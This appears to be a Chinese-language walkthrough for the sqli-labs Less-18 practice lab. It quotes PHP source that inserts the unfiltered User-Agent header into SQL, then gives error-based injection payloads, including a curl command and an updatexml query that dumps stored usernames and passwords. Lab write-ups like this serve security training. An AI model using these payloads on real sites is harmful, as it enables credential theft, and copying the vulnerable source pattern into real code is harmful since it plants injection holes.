# Less-18

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | 请求头注入 · User-Agent |
| **闭合方式** | `'` |
| **注释符** | `不需要 · payload 用 or ... or 包裹` |
| **成败信号** | flag.jpg + XPATH 报错 |
| **一句话** | User-Agent 写库 |
| **核心 payload** | `User-Agent: ' or updatexml(1,concat(0x7e,database()),1) or '` |

---

**请求头注入 · User-Agent**

### 源码

```php
$uagent = $_SERVER['HTTP_USER_AGENT'];        // ← 取 User-Agent，完全没有过滤
$uname  = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);

$sql = "SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$row1 = mysql_fetch_array($result1);

if($row1) {                                   // ← 必须先登录成功
    $insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
    mysql_query($insert);
    echo 'Your User Agent is: ' .$uagent;
    print_r(mysql_error());                   // ← 报错在这里回显
    echo '<img src="../images/flag.jpg"  />';
}
```

### 特点

- `uname` / `passwd` 都被 `check_input()` 过滤了，**打不进去**
- `User-Agent` 头**原样拼进 INSERT 语句**，是注入点
- **必须先正常登录成功**（`admin` / `admin`），否则根本不会执行 INSERT

### 通关 payload（实测）

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-18/" \
     -d "uname=admin&passwd=admin&submit=submit" \
     -H "User-Agent: ' or updatexml(1,concat(0x7e,database()),1) or '"
```

**实测结果**：`flag.jpg` + `XPATH syntax error: '~security'` ✓

**验证注入确实存在**（故意制造语法错误）：
```
User-Agent: a'
→  You have an error in your SQL syntax ... near '127.0.0.1', 'admin')' at line 1
   从报错里能直接看到 INSERT 语句的结构
```

**拖库**（同样要用派生表绕 1093）：
```
User-Agent: ' or updatexml(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) x)),1) or '
→  XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'   ✓
```

> 💡 用 Burp Suite 更方便：抓包 → 改 User-Agent → Forward。

---

[← Less-17](Less-17.md) ｜ [返回目录](README.md) ｜ [Less-19 →](Less-19.md)